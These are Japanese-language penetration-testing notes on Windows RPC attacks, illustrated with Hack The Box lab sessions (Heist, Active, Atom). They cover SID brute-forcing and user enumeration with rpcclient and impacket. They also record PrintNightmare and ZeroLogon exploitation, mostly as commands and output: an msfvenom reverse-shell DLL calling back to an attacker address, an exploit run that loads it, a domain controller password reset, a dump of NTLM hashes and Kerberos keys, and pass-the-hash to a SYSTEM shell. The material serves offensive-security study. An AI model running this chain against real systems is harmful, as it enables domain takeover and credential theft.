# Attack
----

## SID Bruteforce
* セキュリティ識別子（SID）は`S-1-5-ドメイン識別子-相対識別子`で構成される
* ドメイン識別子は予め定められていないが、Administratorなどの一部の相対識別子は予め定められている
  * なお`S-1-5-21-ドメイン識別子-500`はAdministratorである
  * 詳細は[オペレーティング システムの既知のWindows識別子](https://docs.microsoft.com/ja-jp/troubleshoot/windows-server/identity/security-identifiers-in-windows)を参照
* rpcにアクセス可能な権限を有する時、`lookupnames`でドメイン識別子を取得可能
* `lookupsids`でSIDからユーザ名の取得が可能であるため、相対識別子の総当りを行うことで、該当のドメインのユーザを列挙可能
* 上記の相対識別子の総当りを自動化したimpacketのlookupsidsを利用可能
* HTB: Heist

  ```console
  ┌─[✗]─[rio@parrot]─[~/Htb/Heist]
  └──╼ $rpcclient -U hazard -h heist.htb
  Enter WORKGROUP\hazard's password:
  rpcclient $> lookupnames hazard
  hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)
  rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1009
  S-1-5-21-4254423774-1266059056-3197185112-1009 SUPPORTDESK\support (1)
  rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1010
  S-1-5-21-4254423774-1266059056-3197185112-1010 *unknown*\*unknown* (8)
  rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1011
  S-1-5-21-4254423774-1266059056-3197185112-1011 *unknown*\*unknown* (8)
  rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1012
  S-1-5-21-4254423774-1266059056-3197185112-1012 SUPPORTDESK\Chase (1)
  rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1013
  S-1-5-21-4254423774-1266059056-3197185112-1013 SUPPORTDESK\Jason (1)
  rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1014
  S-1-5-21-4254423774-1266059056-3197185112-1014 *unknown*\*unknown* (8)
  rpcclient $> ^C
  ┌─[✗]─[rio@parrot]─[~/Htb/Heist]
  └──╼ $impacket-lookupsid hazard:stealth1agent@heist.htb
  Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
  
  [*] Brute forcing SIDs at heist.htb
  [*] StringBinding ncacn_np:heist.htb[\pipe\lsarpc]
  [*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
  500: SUPPORTDESK\Administrator (SidTypeUser)
  501: SUPPORTDESK\Guest (SidTypeUser)
  503: SUPPORTDESK\DefaultAccount (SidTypeUser)
  504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
  513: SUPPORTDESK\None (SidTypeGroup)
  1008: SUPPORTDESK\Hazard (SidTypeUser)
  1009: SUPPORTDESK\support (SidTypeUser)
  1012: SUPPORTDESK\Chase (SidTypeUser)
  1013: SUPPORTDESK\Jason (SidTypeUser)
  ```

##  enumdomusers
* enumdomusersを利用し、ドメインユーザを列挙可能
* HTB: Active

  ```console
  ┌─[✗]─[rio@parrot]─[~/Htb/Active]
  └──╼ $rpcclient -U svc_tgs -h active.htb
  Enter WORKGROUP\svc_tgs's password:
  rpcclient $> enumdomusers
  user:[Administrator] rid:[0x1f4]
  user:[Guest] rid:[0x1f5]
  user:[krbtgt] rid:[0x1f6]
  user:[SVC_TGS] rid:[0x44f]
  rpcclient $> ^C
  ```

## queryuser
* queryuserを利用し、ユーザのパスワード設定時刻を取得可能
* HTB: Active

  ```console
  ┌─[✗]─[rio@parrot]─[~/Htb/Active]
  └──╼ $rpcclient -U svc_tgs -h active.htb
  Enter WORKGROUP\svc_tgs's password:
  rpcclient $> queryuser administrator
          User Name   :   Administrator
          Full Name   :
          Home Drive  :
          Dir Drive   :
          Profile Path:
          Logon Script:
          Description :   Built-in account for administering the computer/domain
          Workstations:
          Comment     :
          Remote Dial :
          Logon Time               :      金, 22  1月 2021 17:42:31 JST
          Logoff Time              :      木, 01  1月 1970 09:00:00 JST
          Kickoff Time             :      木, 01  1月 1970 09:00:00 JST
          Password last set Time   :      木, 19  7月 2018 04:06:40 JST
          Password can change Time :      金, 20  7月 2018 04:06:40 JST
          Password must change Time:      木, 14  9月 30828 11:48:05 JST
          unknown_2[0..31]...
          user_rid :      0x1f4
          group_rid:      0x201
          acb_info :      0x00000210
          fields_present: 0x00ffffff
          logon_divs:     168
          bad_password_count:     0x00000000
          logon_count:    0x00000023
          padding1[0..7]...
          logon_hrs[0..21]...
  rpcclient $> ^C
  ```

  ## PrintNightmare(CVE-2021-34527)
* rpcdumpでrpcでどのようなサービスが動作しているのか、調査可能
* PrintNightmareの可能性が存在するかどうかは、MS-RPRNが動作しているかどうかを調査すればよい
* [PrintNightmare exploit](https://github.com/cube0x0/CVE-2021-1675)
* Windows 7 <= Windows 10 21H1 && Windows Server 2008 <= Windows Server 2019
* rpcにアクセス可能なユーザアカウントを有する時、System権限を取得可能
* Htb: Atom

  ```console
  ┌─[rio@parrot]─[~/Htb/Atom]
  └──╼ $impacket-rpcdump @10.129.211.146 | grep -A8 MS-RPRN
  Protocol: [MS-RPRN]: Print System Remote Protocol
  Provider: spoolsv.exe
  UUID    : 12345678-1234-ABCD-EF00-0123456789AB v1.0
  Bindings:
            ncacn_ip_tcp:10.129.211.146[49668]
            ncalrpc:[LRPC-47371fd414b47e0f02]
  
  Protocol: N/A
  Provider: N/A
  ┌─[✗]─[rio@parrot]─[~/Htb/Atom/CVE-2021-1675]
  └──╼ $msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.10 LPORT=4444 -f dll -o shell.dll
  [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
  [-] No arch selected, selecting arch: x64 from the payload
  No encoder specified, outputting raw payload
  Payload size: 460 bytes
  Final size of dll file: 8704 bytes
  Saved as: shell.dll
  ┌─[rio@parrot]─[~/Htb/Atom/CVE-2021-1675]
  └──╼ $python3 CVE-2021-1675.py atom/jason:kidvscat_electron_@123@10.129.211.146 '\\10.10.16.10\public\shell.dll'
  [*] Connecting to ncacn_np:10.129.211.146[\PIPE\spoolss]
  [+] Bind OK
  [+] pDriverPath Found C:\WINDOWS\System32\DriverStore\FileRepository\ntprint.inf_amd64_c62e9f8067f98247\Amd64\UNIDRV.DLL
  [*] Executing \??\UNC\10.10.16.10\public\shell.dll
  [*] Try 1...
  [*] Stage0: 0
  [*] Try 2...
  [*] Stage0: 0
  ```
  
## ZeroLogon(CVE-2020-1472)
* DCのコンピュータアカウント(ユーザアカウントにあらず)を0で初期化可能な脆弱性
* コンピュータアカウントはAdministratorsグループに入っていないため、SMBの書き込み権限がなく、SMBを利用した横展開は困難
* ただし、DCSyncの権限が通常与えられているため、ハッシュのリークが可能
* [CVE-2020-1472 POC](https://github.com/dirkjanm/CVE-2020-1472)
* Windows Server 2008 <= Windows Server 2019
* Htb: Active

  ```console
  ┌─[✗]─[rio@parrot]─[~/Htb/Active/CVE-2020-1472]
  └──╼ $impacket-rpcdump @10.129.215.130 | grep -A 20 MS-NRPC
  Protocol: [MS-NRPC]: Netlogon Remote Protocol
  Provider: netlogon.dll
  UUID    : 12345678-1234-ABCD-EF00-01234567CFFB v1.0
  Bindings:
            ncacn_ip_tcp:10.129.215.130[49158]
            ncacn_http:10.129.215.130[49157]
            ncalrpc:[NTDS_LPC]
            ncalrpc:[OLE5C7E43F2E2CE45B897AAB4CA6A17]
            ncacn_ip_tcp:10.129.215.130[49155]
            ncalrpc:[samss lpc]
            ncalrpc:[dsrole]
            ncacn_np:\\DC[\PIPE\protected_storage]
            ncalrpc:[protected_storage]
            ncalrpc:[lsasspirpc]
            ncalrpc:[lsapolicylookup]
            ncalrpc:[LSARPC_ENDPOINT]
            ncalrpc:[securityevent]
            ncalrpc:[audit]
            ncalrpc:[LRPC-f4a12c6cc949704079]
            ncacn_np:\\DC[\pipe\lsass]
  
  ┌─[rio@parrot]─[~/Htb/Active/CVE-2020-1472]
  └──╼ $ldapsearch -x -D svc_tgs@active.htb -w GPPstillStandingStrong2k18 -h 10.129.215.130 -b dc=active,dc=htb '(objectClass=computer)'
  # extended LDIF
  #
  # LDAPv3
  # base <dc=active,dc=htb> with scope subtree
  # filter: (objectClass=computer)
  # requesting: ALL
  #
  
  # DC, Domain Controllers, active.htb
  dn: CN=DC,OU=Domain Controllers,DC=active,DC=htb
  objectClass: top
  objectClass: person
  objectClass: organizationalPerson
  objectClass: user
  objectClass: computer
  cn: DC
  distinguishedName: CN=DC,OU=Domain Controllers,DC=active,DC=htb
  instanceType: 4
  whenCreated: 20180718185035.0Z
  whenChanged: 20210914044622.0Z
  uSNCreated: 12293
  uSNChanged: 98634
  name: DC
  objectGUID:: 8+IJCvv15EeIY91yEStv/Q==
  userAccountControl: 532480
  badPwdCount: 0
  codePage: 0
  countryCode: 0
  badPasswordTime: 0
  lastLogoff: 0
  lastLogon: 132760683827783747
  localPolicyFlags: 0
  pwdLastSet: 132760683827783747
  primaryGroupID: 516
  objectSid:: AQUAAAAAAAUVAAAArxktGAS1AL49Gv126AMAAA==
  accountExpires: 9223372036854775807
  logonCount: 105
  sAMAccountName: DC$
  sAMAccountType: 805306369
  operatingSystem: Windows Server 2008 R2 Standard
  operatingSystemVersion: 6.1 (7601)
  operatingSystemServicePack: Service Pack 1
  serverReferenceBL: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Con
   figuration,DC=active,DC=htb
  dNSHostName: DC.active.htb
  rIDSetReferences: CN=RID Set,CN=DC,OU=Domain Controllers,DC=active,DC=htb
  servicePrincipalName: ldap/DC.active.htb/ForestDnsZones.active.htb
  servicePrincipalName: ldap/DC.active.htb/DomainDnsZones.active.htb
  servicePrincipalName: TERMSRV/DC
  servicePrincipalName: TERMSRV/DC.active.htb
  servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC.active.htb
  servicePrincipalName: DNS/DC.active.htb
  servicePrincipalName: GC/DC.active.htb/active.htb
  servicePrincipalName: RestrictedKrbHost/DC.active.htb
  servicePrincipalName: RestrictedKrbHost/DC
  servicePrincipalName: HOST/DC/ACTIVE
  servicePrincipalName: HOST/DC.active.htb/ACTIVE
  servicePrincipalName: HOST/DC
  servicePrincipalName: HOST/DC.active.htb
  servicePrincipalName: HOST/DC.active.htb/active.htb
  servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/f4953ea5-0f30-4041-
   b4dd-1a00693a8510/active.htb
  servicePrincipalName: ldap/DC/ACTIVE
  servicePrincipalName: ldap/f4953ea5-0f30-4041-b4dd-1a00693a8510._msdcs.active.
   htb
  servicePrincipalName: ldap/DC.active.htb/ACTIVE
  servicePrincipalName: ldap/DC
  servicePrincipalName: ldap/DC.active.htb
  servicePrincipalName: ldap/DC.active.htb/active.htb
  objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=active,DC=htb
  isCriticalSystemObject: TRUE
  dSCorePropagationData: 16010101000000.0Z
  lastLogonTimestamp: 132760673060956836
  msDS-SupportedEncryptionTypes: 31
  msDFSR-ComputerReferenceBL: CN=DC,CN=Topology,CN=Domain System Volume,CN=DFSR-
   GlobalSettings,CN=System,DC=active,DC=htb
  
  # search reference
  ref: ldap://ForestDnsZones.active.htb/DC=ForestDnsZones,DC=active,DC=htb
  
  # search reference
  ref: ldap://DomainDnsZones.active.htb/DC=DomainDnsZones,DC=active,DC=htb
  
  # search reference
  ref: ldap://active.htb/CN=Configuration,DC=active,DC=htb
  
  # search result
  search: 2
  result: 0 Success
  
  # numResponses: 5
  # numEntries: 1
  # numReferences: 3
  
  ┌─[rio@parrot]─[~/Htb/Active/CVE-2020-1472]
  └──╼ $python3 cve-2020-1472-exploit.py 'DC$' 10.129.215.130
  Performing authentication attempts...
  ============================================================================================================================================================================================================================================================================================================================
  Target vulnerable, changing account password to empty string
  
  Result: 0
  
  Exploit complete!
  
  ┌─[✗]─[rio@parrot]─[~/Htb/Active/CVE-2020-1472]
  └──╼ $impacket-psexec -no-pass 'DC$@10.129.215.130'
  Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
  
  [*] Requesting shares on 10.129.215.130.....
  [-] share 'ADMIN$' is not writable.
  [-] share 'C$' is not writable.
  [-] share 'NETLOGON' is not writable.
  [-] share 'Replication' is not writable.
  [-] share 'SYSVOL' is not writable.
  [-] share 'Users' is not writable.
  
  ┌─[✗]─[rio@parrot]─[~/Htb/Active/CVE-2020-1472]
  └──╼ $impacket-secretsdump -no-pass 'DC$@10.129.215.130'
  Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
  
  [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
  [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
  [*] Using the DRSUAPI method to get NTDS.DIT secrets
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b889e0d47d6fe22c8f0463a717f460dc:::
  active.htb\SVC_TGS:1103:aad3b435b51404eeaad3b435b51404ee:f54f3a1d3c38140684ff4dad029f25b5:::
  DC$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  [*] Kerberos keys grabbed
  Administrator:aes256-cts-hmac-sha1-96:003b207686cfdbee91ff9f5671aa10c5d940137da387173507b7ff00648b40d8
  Administrator:aes128-cts-hmac-sha1-96:48347871a9f7c5346c356d76313668fe
  Administrator:des-cbc-md5:5891549b31f2c294
  krbtgt:aes256-cts-hmac-sha1-96:cd80d318efb2f8752767cd619731b6705cf59df462900fb37310b662c9cf51e9
  krbtgt:aes128-cts-hmac-sha1-96:b9a02d7bd319781bc1e0a890f69304c3
  krbtgt:des-cbc-md5:9d044f891adf7629
  active.htb\SVC_TGS:aes256-cts-hmac-sha1-96:d59943174b17c1a4ced88cc24855ef242ad328201126d296bb66aa9588e19b4a
  active.htb\SVC_TGS:aes128-cts-hmac-sha1-96:f03559334c1111d6f792d74a453d6f31
  active.htb\SVC_TGS:des-cbc-md5:d6c7eca70862f1d0
  DC$:aes256-cts-hmac-sha1-96:70c3ef13e7fd9897849898dc45abb6e7d21b7d6c5e1ca15d74bb690f7ca1f61e
  DC$:aes128-cts-hmac-sha1-96:8e04da73d7b248b002d78b91c212201b
  DC$:des-cbc-md5:235df1fd2afb3e5b
  [*] Cleaning up...
  
  ┌─[✗]─[rio@parrot]─[~/Htb/Active/CVE-2020-1472]
  └──╼ $impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed Administrator@10.129.215.130
  Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
  
  [*] Requesting shares on 10.129.215.130.....
  [*] Found writable share ADMIN$
  [*] Uploading file yzhxKnwF.exe
  [*] Opening SVCManager on 10.129.215.130.....
  [*] Creating service IkcN on 10.129.215.130.....
  [*] Starting service IkcN.....
  [!] Press help for extra shell commands
  Microsoft Windows [Version 6.1.7601]
  Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
  
  C:\Windows\system32>whoami
  nt authority\system
  ```

  